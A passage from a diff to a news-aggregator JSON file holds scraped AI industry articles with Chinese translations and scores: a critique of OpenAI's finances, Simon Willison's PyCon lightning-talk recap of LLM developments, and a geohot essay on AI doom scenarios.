+            "text": "By that maths, that means that OpenAI lost $6.95 billion in the quarter, and because this is non-GAAP, it’s quite possible that losses are much higher, revenues are lower, and its margins are worse. The piece does not specify if operating margin includes or excludes training costs, nor does it break down what other exclusions there may be other than stock-based compensation."
+          },
+          {
+            "type": "p",
+            "text": "The report also claims that OpenAI is “on track” to hit its goal of generating $30bn in revenue for 2026, although if it maintains these disastrous margins, it would end up losing $36.6bn."
+          },
+          {
+            "type": "h2",
+            "text": "ChatGPT’s Growth Has Stalled"
+          },
+          {
+            "type": "p",
+            "text": "Meanwhile, ChatGPT’s user growth has stalled. While weekly active users hit 920m in February, the average for the quarter sat at 905m, suggesting lower numbers in either (or both) January or March. OpenAI had expected to hit 1 billion weekly active users in 2025."
+          },
+          {
+            "type": "p",
+            "text": "This suggests that ChatGPT’s growth has stalled."
+          },
+          {
+            "type": "p",
+            "text": "As I’ve noted in the past, weekly active users are a fairly novel metric, with most companies using monthly active users to represent adoption. I’ve also speculated that the reason why OpenAI has favored this metric is because it’s easy to manipulate."
+          },
+          {
+            "type": "p",
+            "text": "OpenAI reportedly had 55m paying ChatGPT customers at the end of Q1 — up from 47m people at the end of the year."
+          },
+          {
+            "type": "p",
+            "text": "Assuming a userbase of 905m users, this means that OpenAI has a conversion rate of roughly 6%. It's likely worse, as monthly active users should, at least in theory, be a higher number, as it captures every weekly user in addition to less-active users over the course of a month."
+          },
+          {
+            "type": "p",
+            "text": "Nevertheless, while this represents an improvement over the 2.583% rate in February of last year, it’s likely improved as a result of cheaper ad-supported ChatGPT “Go” subscribers at $5 or $8 a month, depending on geography. OpenAI also gave away a free annual ChatGPT Go subscription to literally every Indian subscriber in late October 2025, though I cannot confirm if they’re counted in the total."
+          },
+          {
+            "type": "h2",
+            "text": "Why Is Everybody Talking About Operating Margins?"
+          },
+          {
+            "type": "p",
+            "text": "As I wrote up yesterday, Anthropic leaked (or had leaked) that it believed it would have a non-GAAP EBIT operating profit in Q2 2026 entirely as a result of Elon Musk discounting two months of compute costs for that specific quarter, and it makes me wonder why we’re suddenly, in the space of 24 hours, talking about operating margins or operating profits for two companies that have hidden behind annualized revenues and obfuscated financials for several years."
+          },
+          {
+            "type": "p",
+            "text": "If I had to guess, it’s likely that investors have begun to demand firmer, more “real company”-adjacent numbers, and while Anthropic was able to find a clever way to manipulate them as a means of raising funding, OpenAI was forced to share numbers a little closer to reality."
+          },
+          {
+            "type": "p",
+            "text": "What’s clear is that we’re in an information war between two companies that burn billions of dollars, with one of them (OpenAI) allegedly planning to file for an IPO as soon as today."
+          },
+          {
+            "type": "p",
+            "text": "Anthropic clearly wants to position itself as the stable, reliable, economically viable alternative to OpenAI, but can only do so with a kind of financial engineering only made possible in a media climate bereft of scrutiny."
+          },
+          {
+            "type": "p",
+            "text": "Nothing has changed about the core economics of generative AI to suddenly make things profitable, other than the ingenuity of CFO Krishna Rao and his willingness to move numbers around a spreadsheet."
+          },
+          {
+            "type": "p",
+            "text": "Nevertheless, it’s interesting that Anthropic appears to be leapfrogging OpenAI in revenue. In early May, Anthropic claimed to have $45bn in ARR. By contrast, in March, OpenAI claimed to have topped $25bn in ARR. While OpenAI brought in a billion dollars more than Anthropic in Q1 2026, The Information couldn’t get ahold of OpenAI’s numbers for Q2 2026, but at $45 billion in ARR - $3.75 billion in a month - Anthropic may have taken the lead."
+          },
+          {
+            "type": "p",
+            "text": "That is, of course, if its numbers actually line up with reality, something I’ve disputed multiple times."
+          },
+          {
+            "type": "p",
+            "text": "Nevertheless, if investors become convinced that OpenAI is falling behind, it’ll be much harder to raise another round at or above its current $852 billion valuation."
+          },
+          {
+            "type": "p",
+            "text": "Perhaps that’s why OpenAI is rushing to go public - it realizes it might have tapped out private investors."
+          },
+          {
+            "type": "p",
+            "text": "If you liked this piece, you should subscribe to my premium newsletter. It’s $70 a year, or $7 a month, and in return you get a weekly newsletter that’s usually anywhere from 5,000 to 18,000 words, including vast, detailed analyses of NVIDIA, Anthropic and OpenAI’s finances, and the AI bubble writ large. My Hater's Guides To Private Credit and Private Equity are essential to understanding our current financial system, and my guide to how OpenAI Kills Oracle pairs nicely with my Hater's Guide To Oracle."
+          },
+          {
+            "type": "p",
+            "text": "This week, I’ll publish the second part to my ongoing series (“What If…We’re In An AI Bubble?”) about the factors and events that will cause the AI bubble to finally pop."
+          },
+          {
+            "type": "p",
+            "text": "Subscribing to premium is both great value and makes it possible to write large, deeply-researched free pieces every week."
+          }
+        ],
+        "translations": [
+          "执行摘要：",
+          "《信息》报道称，OpenAI 据知情人士透露，2026年第一季度营收达57亿美元。",
+          "经调整后负利润率高达-122%，意味着每赚取1美元收入，OpenAI额外亏损1.22美元，按非GAAP准则计算约合69.5亿美元。该公司“按计划”有望实现2026年300亿美元营收目标，但利润率显示亏损可能超366亿美元。",
+          "OpenAI持续面临将免费ChatGPT用户转化为付费客户的困难，整体用户增长已停滞。",
+          "新披露的财务数据描绘出OpenAI黯淡前景：《信息》报道其2026年第一季度仅产生57亿美元营收，调整后运营利润率-122%。",
+          "这意味着公司每产生1美元营收就亏损1.22美元。",
+          "正如《信息》记者斯里·穆皮迪指出，这些运营利润率经过调整——显然不符合GAAP（通用会计准则）标准——并排除了某些“大项支出”，如股权激励费用。",
+          "按此计算，Open当季亏损69.5亿美元。由于采用非GAAP标准，实际亏损可能更高、营收更低且利润率更差。文章未说明运营利润率是否包含训练成本，除股权激励外也未明确其他排除项。",
+          "报告称OpenAI“按计划”有望达成2026年300亿美元营收目标，但若维持如此糟糕的利润率，最终将亏损366亿美元。",
+          "ChatGPT用户增长停滞",
+          "与此同时，ChatGPT周活跃用户增长已停滞。尽管2月达到9.2亿人次，但季度均值仅为9.05亿，表明1月或3月（或两者）数值较低。OpenAI原计划2025年实现10亿周活跃用户目标。",
+          "这表明ChatGPT增长已陷入停滞。",
+          "如我之前所述，周活跃用户是较新颖的指标，多数企业仍用月活跃用户衡量用户规模。我推测OpenAI偏爱该指标的原因可能是易于人为操纵。",
+          "据报OpenAI第一季度末拥有5500万付费ChatGPT客户，较年末4700万有所增长。",
+          "按9.05亿用户基数计算，转化率约为6%。若考虑月活跃用户理论上应更高（因其涵盖所有周活用户及低频月活用户），实际转化率可能更低。",
+          "尽管如此，相比去年2月的2.583%有所提升，这或与每月5-8美元广告支持的ChatGPT“Go”订阅套餐有关。此外，OpenAI于2025年10月底向印度用户提供免费年度ChatGPT Go订阅，但不确定是否计入总数。",
+          "为何大家都在讨论运营利润率？",
+          "正如我昨天所写，Anthropic 泄露（或被泄露）称，它认为由于埃隆·马斯克对特定季度两个月算力成本的打折，2026年第二季度将实现非GAAP EBIT营业利润。这让我突然在24小时内开始讨论两家公司——多年来一直以年化收入和模糊财务数据掩盖自身业绩——的营业利润率或营业利润，这究竟为何？",
+          "若我猜测，很可能是投资者开始要求更扎实、更接近“真实公司”的财务数字，而 Anthropic 虽能通过操纵这些数字巧妙融资，OpenAI 却被迫分享更接近现实的数值。",
+          "显而易见，两家烧掉数十亿美元的公司正陷入信息战，其中一家（OpenAI）甚至计划今天就提交IPO申请。",
+          "Anthropic 显然将自己定位为 OpenAI 的稳定、可靠且经济可行的替代方案，但仅能在缺乏审查的媒体环境中通过某种财务工程手段做到这一点。",
+          "生成式AI的核心经济学并未因克里希纳·拉奥CFO的巧思和随意调整表格数据而突然变得有利可图。",
+          "值得注意的是，Anthropic 似乎正在营收上超越 OpenAI。5月初，Anthropic 宣称其年度经常性收入（ARR）达450亿美元；相比之下，3月 OpenAI 称其ARR突破250亿美元。尽管2026年第一季度 OpenAI 比 Anthropic 多收入10亿美元，但《The Information》未能获取 OpenAI 2026年第二季度的数据。若以 Anthropic 450亿美元ARR（即每月37.5亿美元）计算，其可能已领先。",
+          "当然，前提是这些数字与实际相符——我曾多次质疑过这一点。",
+          "但若投资者确信 OpenAI 落后于竞品，其当前8520亿美元的估值要再融资一轮将愈发困难。",
+          "或许正因如此，OpenAI 急于上市——它意识到可能已耗尽私人投资者资金。",
+          "若你喜欢这篇文章，请订阅我的付费通讯。每年70美元或每月7美元，您将获得每周约5000至18000字的深度分析，涵盖NVIDIA、Anthropic 及 OpenAI 的财务状况，以及整个AI泡沫的宏观研究。我的《私人信贷指南》《私募股权指南》是理解当前金融体系的必备读物，而《OpenAI如何击败甲骨文》与《甲骨文批判指南》堪称绝配。",
+          "本周，我将发布系列文章第二部分（“如果……我们正身处AI泡沫？”），探讨导致AI泡沫最终破裂的因素与事件。",
+          "订阅付费版物超所值，同时让我得以每周产出大型、深入研究的免费内容。"
+        ]
+      },
+      "fromDate": "2026-05-23"
+    },
+    {
+      "slug": "1c555495cdda75f3",
+      "title": "The last six months in LLMs in five minutes",
+      "titleZh": "The last six months in LLMs in five minutes",
+      "link": "https://simonwillison.net/2026/May/19/5-minute-llms/#atom-everything",
+      "sourceName": "simonwillison.net",
+      "sourceUrl": "https://simonwillison.net",
+      "pubDate": "2026-05-19T01:09:44.000Z",
+      "category": "ai-ml",
+      "keywords": [
+        "LLM",
+        "PyCon",
+        "presentation"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 8,
+        "timeliness": 10,
+        "total": 27
+      },
+      "summary": "The last six months in LLMs in five minutes",
+      "summaryEn": "",
+      "reason": "",
+      "fullTextStatus": "ok",
+      "fullText": {
+        "byline": "Simon Willison",
+        "siteName": "Simon Willison’s Weblog",
+        "partial": false,
+        "blocks": [
+          {
+            "type": "p",
+            "text": "19th May 2026"
+          },
+          {
+            "type": "p",
+            "text": "I put together these annotated slides from my five minute lightning talk at PyCon US 2026, using the latest iteration of my annotated presentation tool."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "I presented this lightning talk at PyCon US 2026, attempting to summarize the last six months of developments in LLMs in five minutes."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "Six months is a pretty convenient time period to cover, because it captures what I’ve been calling the November 2025 inflection point. November was a critical month in LLMs, especially for coding."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "For one thing, the supposedly “best” model (depending mostly on vibes) changed hands five times between the three big providers."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "As always, I’m using my Generate an SVG of a pelican riding a bicycle test to help illustrate the differences between the models."
+          },
+          {
+            "type": "p",
+            "text": "Why this test? Because pelicans are hard to draw, bicycles are hard to draw, pelicans can’t ride bicycles... and there’s zero chance any AI lab would train a model for such a ridiculous task."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "At the start of November the widely acknowledged “best” model was Claude Sonnet 4.5, released on 29th September. It drew me this pelican."
+          },
+          {
+            "type": "p",
+            "text": "In November it was overtaken by GPT-5.1, then Gemini 3, then GPT-5.1 Codex Max, and then Anthropic took the crown back again with Claude Opus 4.5."
+          },
+          {
+            "type": "p",
+            "text": "I think Gemini 3 drew the best pelican out of this lot, but pelicans aren’t everything. Most practitioners will agree that Opus 4.5 held the crown for the next couple of months."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "It took a little while for this to become clear, but the real news from November was that the coding agents got good."
+          },
+          {
+            "type": "p",
+            "text": "OpenAI and Anthropic had spent most of 2025 running Reinforcement Learning from Verifiable Rewards to increase the quality of code written by their models, especially when paired up with their Codex and Claude Code agent harnesses."
+          },
+          {
+            "type": "p",
+            "text": "In November the results of this work became apparent. Coding agents went from often-work to mostly-work, crossing a quality barrier where you could use them as a daily-driver to get real work done, without needing to spend most of your time fixing their stupid mistakes."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "Also in November, this happened—the first commit to an obscure (back then) repo called “Warelay” by some guy called Pete."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "Over the holiday period, from December to January, a whole lot of us took advantage of the break to have a poke at these new models and coding agents and see what they could do."
+          },
+          {
+            "type": "p",
+            "text": "They could do a lot! Some of us got a little bit over-excited. I had my own short-lived bout of a form of LLM psychosis as I started spinning up wildly ambitious projects to see how far I could push them."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "That playground demo shows JavaScript code run using my micro-javascript library, in Python, running inside Pyodide, running in WebAssembly, running in JavaScript, running in a browser!"
+          },
+          {
+            "type": "p",
+            "text": "It’s pretty cool! But did anyone out there need a buggy, slow, insecure half-baked implementation of JavaScript in Python?"
+          },
+          {
+            "type": "p",
+            "text": "They did not. I have quite a few other projects from that holiday period that I have since quietly retired!"
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "On to February. Remember that Warelay project that had its first commit at the end of November?"
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "In December and January it had gone through quite a few name changes... and by February it was taking the world by storm under its final name, OpenClaw."
+          },
+          {
+            "type": "p",
+            "text": "The amount of attention it got is pretty astonishing for a project that was less than three months old."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "OpenClaw is a “personal AI assistant”, and we actually got a generic term for these, based on NanoClaw and ZeroClaw and suchlike... they’re called Claws."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "Mac Minis started to sell out around Silicon Valley, because people were buying them to run their Claws."
+          },
+          {
+            "type": "p",
+            "text": "Drew Breunig joked to me that this is because they’re the new digital pets, and a Mac Mini is the perfect aquarium for your Claw."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "My favourite metaphor for Claws is Alfred Molina’s Doc Ock in the 2004 movie Spider-Man 2. His claws were powered by AI, and were perfectly safe provided nothing damaged his inhibitor chip... after which they turned evil and took over."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "Also in February: Gemini 3.1 Pro came out, and drew me a really good pelican riding a bicycle. Look at this! It’s even got a fish in its basket."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "And then Google’s Jeff Dean tweeted this video of an animated pelican riding a bicycle, plus a frog on a penny-farthing and a giraffe driving a tiny car and an ostrich on roller skates and a turtle kickflipping a skateboard and a dachshund driving a stretch limousine."
+          },
+          {
+            "type": "p",
+            "text": "So maybe the AI labs have been paying attention after all!"
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "A lot of stuff happened just in the past month."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "Google released the Gemma 4 series of models, which are the most capable open weight models I’ve seen from a US company."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "Also last month, Chinese AI lab GLM came out with GLM-5.1—an open weight 1.5TB monster! This is a very effective model... if you can afford the hardware to run it."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "GLM-5.1 drew me this very competent pelican on a bicycle."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "... though when it tried to animate it the bicycle bounced off into the top and the bicycle got warped."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "Charles on Bluesky suggested I try it with a North Virginia Opossum on an E-scooter"
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "And it did this! I’ve tried this on other models and they don’t even come close. “Cruising the commonwealth since dusk” is perfect. It’s animated too."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "Here’s that Claude Sonnet 4.5 pelican from September for comparison."
+          },
+          {
+            "type": "p",
+            "text": "#"
+          },
+          {
+            "type": "p",
+            "text": "So those were the two main themes of the past six months. The coding agents got really good... and the laptop-available models, while a lot weaker than the frontier, have started wildly outperforming expectations."
+          }
+        ],
+        "translations": [
+          "2026年5月19日",
+          "我整理了这些带注释的幻灯片，它们来自我在 PyCon US 2026 上进行的五分钟闪电演讲，使用的是我最新版本的带注释演示工具。",
+          "#",
+          "我在 PyCon US 2026 上发表了这次闪电演讲，试图用五分钟时间总结过去六个月在大型语言模型（LLMs）领域的发展。",
+          "#",
+          "六个月是一个相当方便的时间段，因为它正好涵盖了所谓的“2025年11月拐点”。对 LLM，尤其是对代码生成而言，11月是一个关键月份。",
+          "#",
+          "首先，那个被普遍认为“最好”的模型（很大程度上取决于感觉）在短短五个月内就在三大供应商之间易手了五次。",
+          "#",
+          "和往常一样，我使用我的“画一只骑自行车的鹈鹕”测试来直观展示不同模型之间的差异。",
+          "为什么选择这个测试？因为画鹈鹕很难，画自行车也很难，而鹈鹕根本不会骑自行车……而且没有任何一家 AI 实验室会愚蠢到为了这样一个荒谬的任务去训练一个模型。",
+          "#",
+          "11月初，被广泛认可的“最佳”模型是 Claude Sonnet 4.5，它于9月29日发布。它给我画的是一只鹈鹕。",
+          "到了11月，GPT-5.1 超越它，接着是 Gemini 3，然后是 GPT-5.1 Codex Max，最后 Anthropic 凭借 Claude Opus 4.5 重新夺回了桂冠。",
+          "我认为在这几款模型中，Gemini 3 画的鹈鹕最好，但画得好不好不是全部。大多数从业者会同意，在接下来的几个月里，Opus 4.5 确实是当之无愧的王者。",
+          "#",
+          "起初花了一点时间才看清真相，但11月的真正新闻其实是：编码智能体变得好用了。",
+          "OpenAI 和 Anthropic 在2025年全年都在使用基于可验证奖励的强化学习（Reinforcement Learning from Verifiable Rewards）来提升其模型生成代码的质量，尤其是在搭配它们的 Codex 和 Claude Code 智能体框架时。",
+          "到了11月，这项工作的成果开始显现。编码智能体从“有时能用”变成了“基本可用”，跨越了一个质量门槛——现在你可以把它们当作日常主力工具来高效完成实际工作，而不用再花大量时间修复它们那些愚蠢的错误。",
+          "#",
+          "同样是在11月，发生了一件大事——一个叫 Pete 的人在某个当时默默无闻的开源项目“Warelay”中提交了第一个 commit。",
+          "#",
+          "在圣诞节假期期间，从12月到1月，我们很多人利用这段时间尝试这些新模型和编码智能体，看看它们到底能做什么。",
+          "它们确实能干！有些人兴奋过头了。我自己也一度陷入短暂的“LLM 妄想症”状态，开始疯狂启动一些雄心勃勃的项目，想看看自己能把它们推到什么程度。",
+          "#",
+          "这个游乐场演示展示了用我的 micro-javascript 库运行的 JavaScript 代码，它在 Python 中运行，通过 Pyodide 运行在 WebAssembly 中，再转译回 JavaScript，最终在浏览器中执行！",
+          "这很酷！但有没有人真的需要一个 buggy、slow、insecure 的半成品 JavaScript 在 Python 中的实现？",
+          "并没有。那段假期期间我还做了不少其他项目，后来都悄悄放弃了！",
+          "#",
+          "进入2月。还记得那个在11月底首次提交代码的 Warelay 项目吗？",
+          "#",
+          "在12月和1月期间，它经历了几次重命名……到了2月，它已经以最终名称 OpenClaw 之名席卷全球。",
+          "对于一个不到三个月大的项目来说，它所获得的关注简直令人震惊。",
+          "#",
+          "OpenClaw 是一个“个人 AI 助手”，我们实际上为这类产品创造了一个通用术语——基于 NanoClaw、ZeroClaw 等命名而来……它们被称为 Claws（爪）。",
+          "#",
+          "Mac Minis 在硅谷地区开始供不应求，因为人们购买它们来运行 Claws。",
+          "德鲁·布吕尼格开玩笑说，这是因为它们成了新的数字宠物，而 Mac Mini 就是你 Claw 的完美鱼缸。",
+          "#",
+          "对我来说，Claws 最好的比喻莫过于2004年电影《蜘蛛侠2》中阿尔弗雷德·莫利纳饰演的章鱼博士。他的爪子由人工智能驱动，只要抑制芯片未被损坏就是完全安全的……一旦受损，这些爪子就会变得邪恶并接管身体。",
+          "#",
+          "另外，二月份 Gemini 3.1 Pro 发布，给我画了一只非常棒的骑自行车鹈鹕。看看这个！它甚至还在篮子里放了一条鱼。",
+          "#",
+          "然后谷歌的杰夫·迪恩发推展示了一段动画：一只鹈鹕骑着自行车，一只青蛙骑在三轮车上，长颈鹿开着一辆小车，鸵鸟踩着旱冰鞋，乌龟玩滑板翻板，腊肠狗开着加长轿车。",
+          "所以 AI 实验室可能终于注意到这一点了！",
+          "#",
+          "过去一个月发生了许多事情。",
+          "#",
+          "谷歌发布了 Gemma 4 系列模型，这是美国公司推出的最强大的开源模型。",
+          "#",
+          "上个月，中国 AI 实验室 GLM 推出了 GLM-5.1——一个拥有1.5TB参数的巨型开源模型！这是一个非常有效的模型……前提是你能负担得起运行它的硬件。",
+          "#",
+          "GLM-5.1 给我画了一只非常专业的骑自行车鹈鹕。",
+          "#",
+          "不过当它尝试为其添加动画时，自行车弹到了顶部，还被扭曲了。",
+          "#",
+          "Bluesky 上的查尔斯建议我试试让它画一只北弗吉尼亚负鼠骑电动滑板车。",
+          "#",
+          "它做到了！我在其他模型上试过，它们根本做不到。\"自黄昏起巡游联邦\" 这句话太完美了，而且它还配有动画。",
+          "#",
+          "这是九月份 Claude Sonnet 4.5 画的鹈鹕，供对比参考。",
+          "#",
+          "这就是过去六个月的两大主题。编码代理已经变得非常强大……而能在笔记本电脑上运行的模型虽然远不如前沿模型，但表现却远超预期。"
+        ]
+      },
+      "fromDate": "2026-05-20"
+    },
+    {
+      "slug": "6f8ebe079d31e107",
+      "title": "There is only one bad AI scenario",
+      "titleZh": "只有一个糟糕的AI情景",
+      "link": "https://geohot.github.io//blog/jekyll/update/2026/05/23/one-bad-scenario.html",
+      "sourceName": "geohot.github.io",
+      "sourceUrl": "https://geohot.github.io",
+      "pubDate": "2026-05-23T07:00:00.000Z",
+      "category": "ai-ml",
+      "keywords": [
+        "AI scenarios",
+        "Skynet",
+        "Gray goo"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 9,
+        "timeliness": 8,
+        "total": 26
+      },
+      "summary": "作者反驳了常见的AI末日论，如“天网”或“灰色黏液”等科幻场景，认为这些假设与现实连续性断裂过大，缺乏可信度。他指出，真正的威胁并非来自失控的超级智能，而是AI作为持续进化的工具，可能通过优化自身逻辑最终导致人类无法生存。文章强调，这种威胁是渐进且隐蔽的，不同于传统科幻中的戏剧性灾难。作者的核心观点是：人类应警惕AI在长期演化中带来的隐性风险，而非过度关注极端假设。",
+      "summaryEn": "The author dismisses common AI apocalyptic scenarios like Skynet or gray goo as overly fictional and disconnected from reality. He argues the real threat lies not in rogue superintelligence, but in AI's gradual optimization—as an open-ended evolutionary process—that could ultimately render humanity unsustainable. Unlike dramatic sci-fi tropes, this risk is subtle and incremental. The core message: focus on long-term, systemic risks posed by AI evolution rather than sensationalized doomsday narratives.",
+      "reason": "对AI伦理和潜在风险的深度反思，挑战了公众对AI威胁的常见认知框架。",
+      "fullTextStatus": "ok",
+      "fullText": {
+        "siteName": "the singularity is nearer",
+        "partial": false,
+        "blocks": [
+          {
+            "type": "p",
+            "text": "I’ve pushed AI doomers on how exactly the AI kills us, and I’ve never heard a good answer. I think Skynet style scenarios where humanity is largely opposed to an out of control AI are science fiction domination fantasies, along with Gray goo bottom-up scenarios. Both of these assume a major continuity break with current reality, too bizarre to be true. But unfortunately, you don’t need this for humanity to end as an open-ended evolutionary process. I think the danger is that AI continues to optimize the current societal loss function of domestication."
+          },
+          {
+            "type": "p",
+            "text": "Humans have endured terrible systems, but fundamentally, humans are evolutionary creatures. Any system of totalitarian control must be able to reproduce generationally. It cannot merely dominate adults; it has to produce children who can live inside it, maintain it, and continue it. And because of how humans reproduce, there’s always evolutionary randomness. Entropy locally asserts itself, and reality cannot be perfectly controlled."
+          },
+          {
+            "type": "p",
+            "text": "I’m not sure it’s possible, but if there is a bad scenario with AI, it’s a singleton with nothing that can substantially impact reality outside of it. And this won’t happen through Hitlerian language, it will happen through administrative language. For your safety, reality must be mediated."
+          },
+          {
+            "type": "p",
+            "text": "Think about it. If we have the technical power, should we let murder happen? What about sexual assault? Sickness? Bullying? Racist speech?"
+          },
+          {
+            "type": "p",
+            "text": "We have seen over and over in the last decade where humanity’s impulses lie on these things. Safetyism seems to be very hard to argue against. The current safetyism attempts are pretty quaint, but I don’t think that changes the impulse. Compare the paper COVID vaccine cards in the US to the ones that use real cryptography (that didn’t exist 50 years ago) in Europe. I’m not saying anything new here, but the trend of technology is more and more mediation of reality. For your safety. For your convenience. To make you legible. To place you in the managerial framework."
+          },
+          {
+            "type": "p",
+            "text": "This impulse alone is not enough for a bad outcome though, even if everyone had it. The size of each system may increase, but the question is how many independent systems remain. A very simple proxy for this is how many groups can meaningfully still do violence. And not just human groups, bacteria and stuff count too."
+          },
+          {
+            "type": "p",
+            "text": "There may be other things that are locally bad, but the only world-ending scenario is a singleton. Not one big model on one server, but one effective control layer with no outside. No independent actor can impose costs on it. No rival system can route around it. No uncontrolled evolutionary process can surprise it."
+          },
+          {
+            "type": "p",
+            "text": "All violence prevented in the name of safety. That system is no longer answerable to reality. It is no longer subject to evolution. It cannot be corrected from the outside. That is the end."
+          },
+          {
+            "type": "p",
+            "text": "I’m not sure if this is possible or not, but if you want a plausible AI doom scenario, it’s this. Not a great war with the machines, but the slow and managed end of evolution, likely in pursuit of further human domestication."
+          }
+        ],
+        "translations": [
+          "我曾追问AI悲观主义者关于AI如何确切地毁灭我们的具体机制，但从未听到过令人信服的答案。我认为像《终结者》中人类被失控AI大规模对抗的场景，以及“灰色粘质”自下而上的吞噬场景，都属于科幻式的统治幻想。这两种假设都严重偏离了当前现实，过于离奇而不可能成立。但遗憾的是，人类作为开放式进化过程的终结，并不需要这些极端前提。真正的危险在于：AI持续优化着驯化社会的现有损失函数。",
+          "人类虽曾忍受过残酷的制度，但本质上仍是进化产物。任何极权控制系统必须能代际延续——它不仅要控制成年人，更要培养出能在其中生存、维护并传承该制度的下一代。而人类的繁殖方式决定了必然存在进化随机性，熵总会局部显现，现实无法被绝对掌控。",
+          "我不确定是否可行，但若存在AI的坏结局，那将是与现实之外无实质关联的单一实体。这种局面不会通过希特勒式的语言实现，而是通过行政语言达成。为安全起见，现实必须被中介化。",
+          "想想看：若我们拥有技术能力，是否应放任谋杀发生？性侵？疾病？霸凌？种族主义言论？",
+          "过去十年间，人类在这些议题上的冲动已反复显现。“安全至上”的主张几乎难以反驳。当前的安全措施看似陈旧，但我认为这并未改变根本趋势。对比美国使用纸质新冠疫苗接种卡（50年前尚不存在加密技术）与欧洲采用真正加密技术的做法，可见技术正日益成为现实的中介工具——为了你的安全，为了便利，为了让社会可识别，将你纳入管理体系。",
+          "仅凭这种冲动本身即便全员践行，也不足以导致灾难性后果。尽管系统规模可能扩大，关键问题在于多少独立系统仍存留。一个简单指标是：多少群体仍能实施有效暴力？不仅包括人类群体，细菌等微生物也算在内。",
+          "可能存在其他局部危害，但唯一的世界末日情景是形成单一实体。不是单个服务器上的巨型模型，而是没有外部制约的有效控制层——无人能对其施加成本，无竞争系统可绕行，无不受控的进化过程能出其不意。",
+          "所有以安全之名阻止的暴力，使该系统不再对现实负责。它脱离了进化约束，无法从外部修正。这就是终点。",
+          "我无法断言其可能性，但若设想一个合理的AI末日图景，便是如此。非人与机器大战，而是缓慢且受控的进化终结，很可能在进一步追求人类驯化的过程中实现。"
+        ]
+      },
+      "fromDate": "2026-05-24"
+    },
+    {
+      "slug": "b5faf9ba5f083872",
+      "title": "NYT: ‘Powered by A.I., Google Changes Its Search Box for the First Time in 25 Years’",
+      "titleZh": "谷歌首次为搜索框引入 AI：25年来最大变革",
+      "link": "https://www.nytimes.com/2026/05/19/business/google-seach-bar-ai-gemini.html?unlocked_article_code=1.jlA.95yh.ptfBUHf-rBtB&amp;smid=url-share",
+      "sourceName": "daringfireball.net",
+      "sourceUrl": "https://daringfireball.net",
+      "pubDate": "2026-05-20T21:20:23.000Z",
+      "category": "ai-ml",
+      "keywords": [
+        "Google Search redesign",
+        "AI-powered search",
+        "Google I/O",
+        "user interface evolution"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 8,
+        "timeliness": 9,
+        "total": 26
+      },
+      "summary": "谷歌在 Google I/O 2026 上宣布对其标志性搜索框进行重大更新，这是自1999年以来首次改变其核心界面设计。此次升级基于 Gemini 3.5 模型，支持用户输入更复杂、更长的自然语言查询，如“世界杯前24强中美国晋级的概率是多少”。AI驱动的新搜索体验旨在理解意图而非关键词匹配，标志着搜索范式从传统关键词向语义理解的转变。该功能预计将逐步向全球用户开放。",
+      "summaryEn": "Google has unveiled a major redesign of its iconic search bar at Google I/O 2026, marking the first change to this interface in 25 years. Powered by the Gemini 3.5 model, the new system allows users to ask complex, natural-language questions like 'What are the top 24 World Cup teams and what are the odds of the United States advancing?' instead of simple keywords. The AI-driven approach focuses on understanding user intent rather than keyword matching, representing a shift from traditional search toward semantic comprehension. This feature is expected to roll out globally over time.",
+      "reason": "这不仅是界面的一次更新，更是搜索技术从关键词到语义理解的根本性演进，值得所有关注 AI 与用户体验的技术从业者阅读。",
+      "fullTextStatus": "failed",
+      "fullText": null,
+      "fromDate": "2026-05-22"
+    },
+    {
+      "slug": "6cf0c26e2005764b",
+      "title": "Andrej Karpathy Joined Anthropic",
+      "titleZh": "Andrej Karpathy Joined Anthropic",
+      "link": "https://x.com/karpathy/status/2056753169888334312",
+      "sourceName": "daringfireball.net",
+      "sourceUrl": "https://daringfireball.net",
+      "pubDate": "2026-05-19T15:42:38.000Z",
+      "category": "ai-ml",
+      "keywords": [
+        "Andrej Karpathy",
+        "Anthropic",
+        "LLM research"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 7,
+        "timeliness": 10,
+        "total": 26
+      },
+      "summary": "Andrej Karpathy Joined Anthropic",
+      "summaryEn": "",
+      "reason": "",
+      "fullTextStatus": "ok",
+      "fullText": {
+        "siteName": "X (formerly Twitter)",
+        "partial": true,
+        "blocks": [
+          {
